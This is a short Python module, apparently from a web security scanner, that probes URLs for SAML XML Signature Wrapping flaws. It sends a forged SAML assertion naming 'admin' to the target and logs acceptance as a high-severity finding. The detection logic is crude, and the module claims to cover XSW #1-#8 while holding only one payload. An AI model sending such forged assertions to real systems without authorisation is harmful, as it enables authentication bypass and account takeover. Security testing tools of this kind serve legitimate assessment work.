"""SAML XML Signature Wrapping (XSW) attacks."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

XSW_PAYLOADS = [
    # XSW #1: wrap signed assertion
    """<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
      <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="evil">
        <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
      </saml:Assertion>
    </samlp:Response>""",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    r = get(url)
    if r.status == 0:
        return findings
    body = r.text or ""
    if "saml" in body.lower():
        findings.append(Finding(
            id="saml-xsw-{}".format(hash(url) & 0xffff),
            target=parsed.netloc,
            type="SAML XSW Candidate",
            severity="medium",
            url=url,
            parameter="SAMLResponse",
            payload="XSW #1-#8",
            evidence="SAML endpoint; test XML Signature Wrapping",
            response_snippet=body[:200],
            confidence=0.5,
        ))
    for payload in XSW_PAYLOADS:
        resp = post(url, data=payload, headers={"Content-Type": "application/xml"})
        if resp.status != 0 and resp.status in (200, 302):
            findings.append(Finding(
                id="saml-xsw-accept-{}".format(hash(url) & 0xffff),
                target=parsed.netloc,
                type="SAML XSW Accepted",
                severity="high",
                url=url,
                parameter="SAMLResponse",
                payload=payload[:60],
                evidence="Server accepted wrapped assertion (status {})".format(resp.status),
                response_snippet=resp.snippet(200),
                confidence=0.5,
            ))
    log_event(parsed.netloc, "saml_xsw_scan", {"url": url, "findings": len(findings)})
    return findings
